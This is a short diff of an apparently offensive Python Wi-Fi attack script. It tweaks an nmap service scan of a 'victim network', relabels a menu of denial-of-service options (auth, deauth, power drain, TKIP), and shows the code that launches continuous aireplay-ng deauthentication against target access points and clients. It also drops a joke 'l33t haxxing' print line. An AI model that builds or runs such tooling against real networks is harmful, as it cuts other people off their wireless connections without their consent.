@@ -73,7 +73,7 @@ def dump_network_info(Info):
         ips = subprocess.check_output(["grep", "inet", "-m", "1"], stdin=sp.stdout).decode()[9:26]
         # print(ips)
         sp.wait()
-        nmap = subprocess.call(["nmap", "-T4", "-n", "-sV", "-oX", FILE_PREFIX+".xml", ips], stdout=subprocess.DEVNULL) # should we print nmap results to screen too?
+        nmap = subprocess.call(["nmap", "--version-light", "-F", "-T4", "-n", "-sV", "-oX", FILE_PREFIX+".xml", ips], stdout=subprocess.DEVNULL) # should we print nmap results to screen too?
         print("Done.\n")
     else:
         print("You are not connected to " + victim_network + ".\n")
@@ -275,8 +275,8 @@ def execute_hack(info, victims):
 
     # CHECK VICTIMS
     if victims:
-        user_input = input("Enter A for AUTH DoS, D for DISASSOC DoS, P for POWER DRAIN, T for TKIP DoS: ").strip()
-        if user_input.lower() == "d": # Disassociation DoS
+        user_input = input("Enter A for AUTH DoS, D for DEAUTH DoS, P for POWER DRAIN, T for TKIP DoS: ").strip()
+        if user_input.lower() == "d": # Deauth DoS
             for vic in victims:
                 subprocess.call(["x-terminal-emulator","-e","sudo", "aireplay-ng", "-0", "0", "-a", info.bssid, "-c", vic, "-e", info.ssid, info.mon_interface])
         elif user_input.lower() == "p": # Power Drain
@@ -301,6 +301,5 @@ if __name__ == "__main__":
         info = dump_network_info(Info)
         victims = create_target_table()
         execute_hack(info, victims)
-        print("uber l33t haxxing just happened")
     else:
         print("Script requires root access to perform network operations.")
